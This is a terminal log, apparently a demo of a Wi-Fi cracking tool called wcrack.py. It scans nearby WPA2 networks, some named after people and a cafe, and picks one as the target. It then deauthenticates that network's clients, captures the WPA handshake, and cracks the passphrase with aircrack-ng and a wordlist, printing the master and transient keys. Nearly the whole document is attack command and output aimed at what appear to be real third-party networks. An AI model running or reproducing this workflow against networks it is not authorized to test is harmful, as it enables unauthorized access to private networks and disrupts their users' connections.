```assembly
┌─[✗]─[rebellion@parrot]─[~/Desktop/Wcrack]
└──╼ $sudo python wcrack.py -m 1 -i wlan0mon -d mini.txt -w capfile

                  .-  _           _  -.
                 /   /             \   \
                (   (  (` (-o-) `)  )   )
                 \   \_ `  -+-  ` _/   /
                  `-       -+-       -`
                           -+-
   ██╗    ██╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
   ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
   ██║ █╗ ██║██║     ██████╔╝███████║██║     █████╔╝
   ██║███╗██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗
   ╚███╔███╔╝╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══╝╚══╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                  CODED BY REBE11ION

[*] Path: {mini.txt} Lines {10001}
[~] Channel Specified: NONE Hopper Status [Running]
[^] Scanning! Press [CTRL+C] to stop.

  NO  ESSID              PWR  ENC    CIPHER    AUTH      CH  BSSID
----  ---------------  -----  -----  --------  ------  ----  -----------------
   1  Vodafone           -49  WPA2   TKIP      PSK       10  58:D7:59:XXXXXXXX
   2  LINKDSL-shetoos    -56  WPA2   TKIP      PSK        6  A4:7E:39:XXXXXXXX
   3  Mariam & ahmed     -56  WPA2   CCMP      PSK        6  34:37:59:XXXXXXXX
   4  Noor               -56  WPA2   TKIP      PSK       10  58:BA:D4:XXXXXXXX
   5  MRX                -56  WPA2   TKIP      PSK        1  94:A7:B7:XXXXXXXX
   6  Voda               -57  WPA2   TKIP      PSK       11  BC:75:74:XXXXXXXX
   7  El-gawhara cafe    -68  WPA2   TKIP      PSK       10  3C:67:8C:XXXXXXXX
   8  O Allah help us    -73  WPA2   TKIP      PSK       11  00:66:4B:XXXXXXXX
   9  TEData             -77  WPA2   TKIP      PSK        5  30:99:35:XXXXXXXX

[?] Enter Your Target Number [q]uit/[n]: 5
[*] Changing Channel to 1 [SuccessFul]
[?] AP Clients [0] Scan Further?[Y/n] y
[*] Scanning for Access Point Stations. Press [CTRL+C] to Stop.
[*] Station 8C18D9XXXXXX <> 94A7B7XXXXXX [Data Frame]
[*] Station FFFFFFFFFFFF <> 94A7B7XXXXXX [Data Frame]
[+] Clients 94A7B74ECB9E - [Found 2]
[*] Time Interval [15] -> Implies Gap b/w Frames is 15
[^] 32-> FFFFFFXXXXXX >< 94A7B7XXXXXX [Deauthentication]
[^] 32-> 8C18D9XXXXXX >< 94A7B7XXXXXX [Deauthentication]
[^] 32-> FFFFFFXXXXXX >< 94A7B7XXXXXX [Deauthentication]
[^] 32-> 8C18D9XXXXXX >< 94A7B7XXXXXX [Deauthentication]
[+] Handshake 94A7B74ECB9E (zte) [Captured]
[+] Handshake >> [capfile] Count [4] [Saved]
Opening capfile
Reading packets, please wait...

                                 Aircrack-ng 1.2 

      [00:00:22] 9972/10000 keys tested (464.16 k/s) 

      Time left: 0 seconds                                      99.72%

                          KEY FOUND! [ XXXXXXXXXXX ]


      Master Key     : 21 7E A0 BD AF C7 86 C9 C5 1D 40 63 2C 01 2B 4E 
                       0F 2E 93 A5 A4 D0 BA 49 4E 42 24 85 F7 C7 70 23 

      Transient Key  : B7 18 82 8F 23 4E BF FE 98 7D DB E1 3B 7C 31 07 
                       16 6C F7 A6 9E 5A 4C 42 55 1B 07 4C 55 77 40 A0 
                       8F B4 F2 2B 45 89 9E B4 11 09 61 1B 28 30 85 FA 
                       87 36 9E 9E E3 02 76 61 CD DF 1D FF 33 75 95 4A 

      EAPOL HMAC     : DD D8 F7 71 CC E8 C6 15 FB CB 46 97 CC 22 6D 30 

```
